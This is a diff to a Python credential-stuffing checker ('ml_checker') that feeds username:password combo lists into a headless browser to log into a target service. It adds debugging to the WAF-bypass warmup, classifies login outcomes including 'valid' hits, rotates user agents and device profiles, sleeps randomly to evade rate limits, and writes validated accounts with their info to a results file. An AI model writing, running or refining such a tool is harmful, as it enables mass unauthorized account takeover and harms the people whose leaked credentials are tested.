@@ -2,6 +2,7 @@ import argparse
 import csv
 import hashlib
 import json
+import os
 import queue
 import random
 import re
@@ -87,7 +88,12 @@ def is_challenge(body):
 
 
 def classify(body, http_status):
-    if http_status == 0: return "timeout"
+    if http_status == 0:
+        b = body or ""
+        if "Executable doesn't exist" in b: return "no_browser"
+        if "Target closed" in b or "browser has been closed" in b: return "browser_crash"
+        if "ERR:" in b: return "net_error"
+        return "timeout"
     if http_status in (403, 429, 503): return "waf"
     if is_challenge(body): return "waf"
     if "Error_Success" in body: return "valid"
@@ -522,7 +528,7 @@ def load_devices(path):
             except Exception:
                 pass
     if not out:
-        print(f"[devices] {path} missing or empty - using BUILTIN_DEVICES", file=sys.stderr)
+        print(f"[devices] {path} missing or empty - using BUILTIN_DEVICES", flush=True)
         return list(BUILTIN_DEVICES)
     return out
 
@@ -815,17 +821,37 @@ class Checker:
             },
         )
         self.page = self.ctx.new_page()
+        self._warmup()
 
     def _warmup(self):
-        try: self.page.goto(WAF_URL, wait_until="networkidle", timeout=30_000)
-        except Exception as e: self.log_q.put(f"[waf] {e}")
-        try: self.page.wait_for_timeout(1500)
-        except Exception: pass
+        try:
+            self.page.goto(WAF_URL, wait_until="domcontentloaded", timeout=30_000)
+            print(f"[warmup] url={self.page.url}", flush=True)
+            try:
+                print(f"[warmup] title={self.page.title()}", flush=True)
+            except Exception:
+                pass
+        except Exception as e:
+            print(f"[warmup] goto FAILED: {e}", flush=True)
+            self.log_q.put(f"[waf] {e}")
+        try:
+            self.page.wait_for_timeout(2500)
+        except Exception:
+            pass
+        try:
+            cookies = self.ctx.cookies()
+            names = sorted({c["name"] for c in cookies})
+            print(f"[warmup] cookies={names}", flush=True)
+            if "acw_sc__v2" not in names:
+                print("[warmup] WARNING: acw_sc__v2 missing - WAF challenge did not run", flush=True)
+        except Exception as e:
+            print(f"[warmup] cookie check failed: {e}", flush=True)
 
     def rotate(self):
         self.ua_index += 1
+        print(f"[rotate] ua_index -> {self.ua_index}", flush=True)
         self.log_q.put(f"[rotate] ua_index -> {self.ua_index}")
-        self._new_context(); self._warmup()
+        self._new_context()
 
     def login(self, account, password):
         with self.lock:
@@ -854,6 +880,7 @@ class Checker:
                 )
             except Exception as e:
                 last_err = f"eval:{e}"
+                print(f"[login] {account} attempt {attempt+1} error: {e}", flush=True)
                 time.sleep(0.5)
                 continue
             status = int(res.get("status", 0))
@@ -862,6 +889,7 @@ class Checker:
             if kind != "timeout":
                 return Result(account, password, kind, body)
             last_err = body
+            print(f"[login] {account} attempt {attempt+1} status={status} body={body[:120]!r}", flush=True)
             time.sleep(0.5)
         return Result(account, password, "timeout", last_err)
 
@@ -885,7 +913,7 @@ def run(infile, outfile, workers, headless, with_info, devices_file):
     combos = load_combos(infile)
     if not combos:
         print(f"no combos in {infile}", file=sys.stderr); return 2
-    print(f"loaded {len(combos)} combos" + (" (+info)" if with_info else ""))
+    print(f"loaded {len(combos)} combos" + (" (+info)" if with_info else ""), flush=True)
     devices = load_devices(devices_file) if with_info else []
     log_q = queue.Queue()
     results = []
@@ -896,7 +924,7 @@ def run(infile, outfile, workers, headless, with_info, devices_file):
         checkers = []
         for _ in range(workers):
             c = Checker(browser, log_q)
-            c._new_context(); c._warmup()
+            c._new_context()
             checkers.append(c)
         chunks = [combos[i::workers] for i in range(workers)]
 
@@ -913,7 +941,8 @@ def run(infile, outfile, workers, headless, with_info, devices_file):
                 with results_lock:
                     results.append(r)
                 extra = f" -> {r.info[:80]}" if r.info else ""
-                log_q.put(f"[{r.status:7s}] {account}:{password}{extra}")
+                print(f"[{r.status:12s}] {account}:{password}{extra}", flush=True)
+                log_q.put(f"[{r.status:12s}] {account}:{password}{extra}")
                 time.sleep(3.0 + random.random() * 8.0)
 
         try:
@@ -935,8 +964,9 @@ def run(infile, outfile, workers, headless, with_info, devices_file):
         for r in results:
             w.writerow([r.account, r.password, r.status, r.body[:4000], r.info])
 
-    full_path = Path("/sdcard/npa/valid_full.txt")
-    full_path.parent.mkdir(parents=True, exist_ok=True)
+    _data_dir = Path(os.environ.get("ML_DATA_DIR", "/tmp/npa"))
+    _data_dir.mkdir(parents=True, exist_ok=True)
+    full_path = _data_dir / "valid_full.txt"
     with full_path.open("a", encoding="utf-8") as f:
         for r in results:
             if r.status != "valid" or not r.info: continue
@@ -950,22 +980,23 @@ def run(infile, outfile, workers, headless, with_info, devices_file):
     counts = {}
     for r in results:
         counts[r.status] = counts.get(r.status, 0) + 1
-    print("done:", counts)
-    print(f"results -> {outfile}")
-    print(f"valid hits -> {full_path}")
+    print("done:", counts, flush=True)
+    print(f"results -> {outfile}", flush=True)
+    print(f"valid hits -> {full_path}", flush=True)
     while not log_q.empty():
-        print(log_q.get())
+        print(log_q.get(), flush=True)
     return 0
 
 
 def main(argv=None):
     ap = argparse.ArgumentParser(prog="ml_checker")
     ap.add_argument("-f", "--file", type=Path, required=True)
-    ap.add_argument("-o", "--out", type=Path, default=Path("/sdcard/npa/results.txt"))
+    _data_dir = Path(os.environ.get("ML_DATA_DIR", "/tmp/npa"))
+    ap.add_argument("-o", "--out", type=Path, default=_data_dir / "results.txt")
     ap.add_argument("-w", "--workers", type=int, default=WORKERS)
     ap.add_argument("--headed", action="store_true")
     ap.add_argument("--info", action="store_true")
-    ap.add_argument("--devices", type=str, default="/sdcard/npa/devices.txt")
+    ap.add_argument("--devices", type=str, default=str(_data_dir / "devices.txt"))
     args = ap.parse_args(argv)
 
     if not args.file.exists():
